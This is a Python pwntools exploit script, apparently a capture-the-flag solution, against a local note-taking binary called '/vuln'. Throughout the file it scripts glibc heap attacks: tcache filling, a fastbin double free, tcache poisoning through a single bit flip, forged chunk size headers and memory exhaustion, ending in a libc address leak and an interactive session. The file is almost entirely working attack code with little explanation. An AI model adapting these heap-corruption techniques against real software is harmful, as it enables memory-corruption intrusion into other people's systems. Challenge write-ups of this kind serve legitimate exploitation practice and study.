import pwn

limit=0x2cbfff+1
p = pwn.process(['prlimit',f'--rss={limit}',f'--as={limit}','/vuln'])

#p = pwn.process('vuln')
sizes = []
read_idx = None
n = 0
dummies = {0xa0:[], 0x80:[]}

def getidx():
    i = 0
    while True:
        if i in sizes:
            i += 1
            continue
        sizes.append(i)
        return i

def add(note):
    global n
    n -= 1
    p.sendlineafter(b'>',(n-0x12) * b'a')
    p.sendlineafter(b'Note: ',note)
    return getidx()

def quit():
    p.sendlineafter(b'>',b'q')

def edit(idx,note, padding = False):
    global n
    n -=1
    p.sendlineafter(b'>',(n-0x12) * b'e')
    
    n-=1
    p.sendlineafter(b'Index: ',f'{idx}'.encode().rjust(n-0x12,b' '))


    if not padding:
        p.sendlineafter(b'Note: ',note)
        n = len(note) -1
    else:
        n-=1
        p.sendlineafter(b'Note: ', note + (n-0x12 - len(note))* b'p')

def remove(idx):
    global n 
    n -= 1

    p.sendlineafter(b'>',(n-0x12) * b'r')

    n -=1
    
    p.sendlineafter(b'Index: ',f'{idx}'.encode().rjust(n-0x12,b' '))

    if not idx in sizes:
        print("double free")
        return
    sizes.remove(idx)

def flipnote(idx,byte, bit):
    global n
    
    n -= 1
    p.sendlineafter(b'>',(n-0x12) * b'f')
    
    n -= 1
    p.sendlineafter(b'Index: ',f'{idx}'.encode().rjust(n-0x12,b' '))
    
    n -= 1
    offset = 8 * byte +bit
    p.sendlineafter(b'Offset: ',f'{offset}'.encode().rjust(n-0x12,b' '))




def realloc_lb_helper(i):
    global n
    n = i
    i -= 0x12 # i is the actual chunk size
    p.sendlineafter(b'>',i * b'i') # trigger Invalid Option to don't change anything else

def realloc_lb(i):
    realloc_lb_helper((i>>1)+0x9)
    realloc_lb_helper(i)


def empty(size, k =7):
    arr = dummies[size]
    for i in range(k):
        tmp = add((size-0x10) * b'd')
        arr.append(tmp)

def fill(k,size):
    arr = dummies[size]
    for i in range(k):
        remove(arr[i])



def leak_libc():
    # fill tcache of size 0xa0
    realloc_lb(7*0xa0+0xf0)
    realloc_lb(6*0xa0+0xf0)
    realloc_lb(5*0xa0+0xf0)
    realloc_lb(4*0xa0+0xf0)
    realloc_lb(3*0xa0+0xf0)
    realloc_lb(2*0xa0+0xf0)
    realloc_lb(1*0xa0+0xf0)
    realloc_lb(0xf0) # force some specific alignment for flip later
    realloc_lb(0xc0)
    realloc_lb(0x90)
    realloc_lb(0x60)
    realloc_lb(0x30)
    realloc_lb(0xa0)
    realloc_lb(0x80)
    flip = add(b'flip')
    
    # fast dup
    realloc_lb(0xb0) # free target chunk
    tar = add(b'tar') # allocate target chunk

    empty(0x80) # fill tcache
    fill(7,0x80)

    remove(tar) # fill fastbin
    remove(flip)
    remove(tar)

    empty(0x80) # empty tcache

    realloc_lb(0x60) # split 0x100 chunk into chunks smaller than 0x80
    # the next chunk of size 0x80 is the same as tar
    realloc_lb(0x80)

    # insert dummies, to allocate tar at note index 15, so fake won't overwrite it later
    empty(0xa0,6)

    flip = add(b"flip") # allocate tar and flip again
    tar = add(b"tar")

    fill(6,0xa0)


    # flip -> tar in tcache
    remove(tar)
    remove(flip)
    
    # tcache poisoning
    flipnote(flip,0,4)
    flip = add(b'flip')
    
    realloc_lb(0x80) # increase size var again
    
    global n
    size = n-0x20
    fake = add(0x8 * b'h'+pwn.p64(0x81) +size * b'h')

    fill(6,0x80) # 7th is now corrupted
    
    realloc_lb(0x80) # increase size var again
    edit(fake, 0x8 * b'h' +pwn.p64(0xa1),padding = True)
    
    
    # now take all available memory
    add((0x1e010 - 0x100)* b'm')
    add((0xf10 - 0x100 )* b'm')
    add((0x790 -0x100 )* b'm')
    add((0x3d0 - 0x100 )* b'm')
    add((0x100 - 0x50)* b'm')
    add((0x100 - 0x50)* b'm')
    
    remove(tar)
    realloc_lb_helper(0x80)
    leak = pwn.u64(p.recvline().split(b'Invalid option: ')[1][:-1].ljust(8,b'\x00'))
    print("libc leak: ",hex(leak))
    return leak    

    

    

def main():
    try:
        input()
        leak_libc()
        
        p.interactive()
    except EOFError:
        print(p.recvall())

if __name__ == "__main__":
    main()
